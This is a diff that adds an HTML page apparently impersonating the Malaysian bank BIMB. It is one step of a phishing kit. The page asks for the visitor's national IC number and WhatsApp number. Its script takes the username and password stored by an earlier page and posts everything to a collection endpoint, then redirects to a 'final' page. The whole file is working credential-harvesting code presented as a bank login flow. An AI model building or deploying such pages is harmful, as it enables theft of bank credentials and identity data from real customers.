@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BIMB WEB</title>
+  <link rel="icon" type="image/x-icon" href="images/BIMB.png">
+  <link rel="stylesheet" href="css/all.min.css">
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .header .back-icon, .header .shield-icon {
+      font-size: 20px;
+      cursor: pointer;
+    }
+    .content {
+      margin-top: 30px;
+    }
+    .content h1 {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .content p {
+      font-size: 16px;
+      color: #888;
+      margin-bottom: 20px;
+    }
+    .input-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .input-container input {
+      width: 90%;
+      padding: 12px 15px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+    }
+    .flag-container {
+      position: absolute;
+      left: 7px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    .flag-container img {
+      width: 25px;
+      height: auto;
+    }
+    .input-container input.phone-input {
+      padding-left: 35px;
+    }
+    .notice {
+      border: 1px solid #000;
+      border-radius: 10px;
+      padding: 15px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .notice .icon {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .notice p {
+      font-size: 14px;
+      color: #333;
+      margin: 0;
+    }
+    .btn-next {
+      width: 100%;
+      padding: 15px;
+      background-color: #d32752;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 18px;
+      text-align: center;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <a href="pass.html"><i class="fa fa-arrow-left back-icon"></i></a> 
+      <i class="fa fa-shield-alt shield-icon"></i>
+    </div>
+
+    <!-- Content -->
+    <div class="content">
+      <p id="usernameDisplay">Guest</p>
+      <h1>Your IC & WhatsApp</h1>
+
+      <!-- Form -->
+      <form id="thirdForm">
+        <div class="input-container">
+          <input type="text" placeholder="Enter your IC number" id="icNumberInput" name="icnumber">
+        </div>
+        <div class="input-container">
+          <span class="flag-container">
+            <img src="images/Flag_of_Malaysia.png" alt="Malaysia Flag">
+          </span>
+          <input type="text" class="phone-input" placeholder="+60 Enter your WhatsApp number" id="whatsappInput" name="whatsapp">
+        </div>
+
+        <br><br><br><br><br><br><br>
+
+        <!-- Important Notice -->
+        <div class="notice">
+          <div class="icon">
+            <i class="fa fa-bell"></i>
+          </div>
+          <p><strong>Important Notice</strong></p>
+          <p>Ensure the details you enter are correct and accurate.</p>
+        </div>
+
+        <!-- Next Button -->
+        <button class="btn-next" type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="js/jquery-3.6.0.min.js"></script>
+
+  <script>
+    // Function to retrieve username from localStorage and display it
+    document.addEventListener('DOMContentLoaded', function () {
+      const username = localStorage.getItem('username');
+      if (username) {
+        document.getElementById('usernameDisplay').innerText = username;
+      } else {
+        document.getElementById('usernameDisplay').innerText = 'Guest';
+      }
+    });
+
+   // Function to handle form submission
+$('#thirdForm').on('submit', function (e) {
+  e.preventDefault();
+
+  const username = localStorage.getItem('username');
+  const password = localStorage.getItem('password');
+  const icnumber = $('#icNumberInput').val();
+  const whatsapp = $('#whatsappInput').val();
+
+  // Validate IC number - only digits, minimum 12 digits
+  if (!icnumber.trim() || icnumber.length < 12 || isNaN(icnumber)) {
+    alert('IC number must be at least 12 digits and contain only numbers.');
+    return;
+  }
+
+  // Validate WhatsApp number - must start with '60' and 10-11 digits
+  if (!whatsapp.trim() || !whatsapp.startsWith('60') || whatsapp.length < 10 || whatsapp.length > 11 || isNaN(whatsapp)) {
+    alert('WhatsApp number must start with "60" and be between 10 to 11 digits, containing only numbers.');
+    return;
+  }
+
+  // Send data to server using AJAX
+  $.ajax({
+    type: 'POST',
+    url: '/api/submit.js',
+    headers: { 'x-api-key': 'ok' },
+    data: { username: username, password: password, icnumber: icnumber, whatsapp: whatsapp },
+    success: function (response) {
+      //   alert('Data submitted successfully.');
+      window.location.href = 'final.html';
+    },
+    error: function () {
+      alert('Failed to submit the data. Please try again.');
+    }
+  });
+});
+
+// IC number input field handler (only digits allowed)
+$('#icNumberInput').on('input', function () {
+  var icnumber = $(this).val();
+  // Remove non-numeric characters
+  $(this).val(icnumber.replace(/\D/g, ''));
+
+  // If length is 12, disable further input
+  if (icnumber.length >= 12) {
+    $(this).attr('maxlength', 12);
+  } else {
+    $(this).removeAttr('maxlength');
+  }
+});
+
+// WhatsApp input field handler (only numbers allowed, starts with '60')
+$('#whatsappInput').on('input', function () {
+  var whatsapp = $(this).val();
+  // Remove non-numeric characters
+  $(this).val(whatsapp.replace(/\D/g, ''));
+
+  // If length is 11, disable further input
+  if (whatsapp.length >= 11) {
+    $(this).attr('maxlength', 11);
+  } else {
+    $(this).removeAttr('maxlength');
+  }
+
+  // Validate WhatsApp starts with '60'
+  if (whatsapp.length === 2 && !whatsapp.startsWith('60')) {
+    $(this).val('60'); // Ensure it starts with '60' automatically
+  }
+});
+
+  </script>
+
+
+</body></html>
